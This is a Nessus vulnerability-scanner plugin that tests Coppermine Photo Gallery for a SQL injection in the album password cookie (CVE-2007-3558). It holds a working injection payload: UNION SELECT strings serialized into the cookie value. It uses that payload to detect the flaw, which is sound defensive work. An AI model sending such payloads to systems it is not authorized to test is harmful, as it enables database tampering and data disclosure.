#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(31137);
  script_version("$Revision: 1.17 $");

  script_cve_id("CVE-2007-3558");
  script_bugtraq_id(24710, 27372);
  script_osvdb_id(37064);
  script_xref(name:"EDB-ID", value:"4950");
  script_xref(name:"EDB-ID", value:"4961");
  script_xref(name:"Secunia", value:"25846");

  script_name(english:"Coppermine Photo Gallery album Password Cookie SQL Injection");
  script_summary(english:"Tries to generate a SQL error");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to a
SQL injection attack." );
 script_set_attribute(attribute:"description", value:
"The version of Coppermine installed on the remote host fails to
sanitize user-supplied input to the album password cookie before using
it in a database query in the 'get_private_album_set' function in
'include/functions.inc.php'.  Regardless of PHP's 'magic_quotes_gpc'
setting, an attacker may be able to exploit this issue to manipulate
database queries, leading to disclosure of sensitive information,
execution of arbitrary code, or attacks against the underlying
database." );
 script_set_attribute(attribute:"see_also", value:"http://coppermine-gallery.net/forum/index.php?topic=44845.0" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Coppermine 1.4.11 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/02/25");
 script_set_attribute(attribute:"vuln_publication_date", value: "2007/06/30");
 script_cvs_date("$Date: 2016/05/19 17:45:33 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:coppermine:coppermine_photo_gallery");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("coppermine_gallery_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);

# Test an install.
install = get_kb_item(string("www/", port, "/coppermine_photo_gallery"));
if (isnull(install)) exit(0);

init_cookiejar();

matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];
  url = string(dir, "/index.php");

  # Find a public album and the cookie.
  r = http_send_recv3(method: 'GET', item:url, port:port);
  if (isnull(r)) exit(0);

  aid = NULL;
  cookie_prefix = NULL;
  res = r[1]+'\r\n'+r[2];
  pat = 'thumbnails.php\\?album=([0-9]+)';
  matches = egrep(pattern:pat, string:res);
  if (matches)
  {
    foreach match (split(matches))
    {
      match = chomp(match);
      item = eregmatch(pattern:pat, string:match);
      if (!isnull(item))
      {
        aid = item[1];
        break;
      }
    }
  }

  cookies = get_http_cookies_names(name_regex: '^.+_data$');
  if (max_index(cookies) > 0)
   cookie_prefix = cookies[0] - "_data";
  else
   cookie_prefix = NULL;
  # Try to exploit the vulnerability to make the album appear in FORBIDDEN_SET
  # so we won't see it.
  if (isnull(aid) || isnull(cookie_prefix))
  {
      debug_print("couldn't find an album to use!");
      if (isnull(cookie_prefix)) debug_print("couldn't find the cookie prefix!");
  }
  else
  {
    h = hexstr(string(aid, ") UNION SELECT ", aid, " LIMIT 99999999--"));
    magic = string(rand());
    sql1 = string(aid, ") UNION SELECT 0x", h, ",", magic, " LIMIT 1,1--");
    sql2 = string(aid, ") UNION SELECT 0x", h, ",", magic, " --");
    exploit = string(
      'a:2:{',
        's:', strlen(sql1), ':"', sql1, '";s:6:"nessus";',
        's:', strlen(sql2), ':"', sql2, '";s:', strlen(magic), ':"', magic, '";',
      '}'
    );

    set_http_cookie(name: cookie_prefix+"_albpw", value: urlencode(str:exploit));
    r2 = http_send_recv3(port:port, method: 'GET', item: url);
    if (isnull(r2)) exit(0);

    # If we don't see the album this time...
    if (
      "<!-- Start standard table" >< r2[2] &&
      string("thumbnails.php?album=", aid) >!< r2[2]
    )
    {
      # Unless we're being paranoid, get the list again to be sure the
      # album wasn't just deleted.
      vuln = FALSE;
      if (report_paranoia < 2)
      {
        r3 = http_send_recv3(port:port, item: url, method: 'GET');
        if (isnull(r3)) exit(0);

        if (string("thumbnails.php?album=", aid) >< r3[2]) vuln = TRUE;
      }
      else vuln = TRUE;

      if (vuln)
      {
        security_hole(port);
	set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
        exit(0);
      }
    }
  }
}
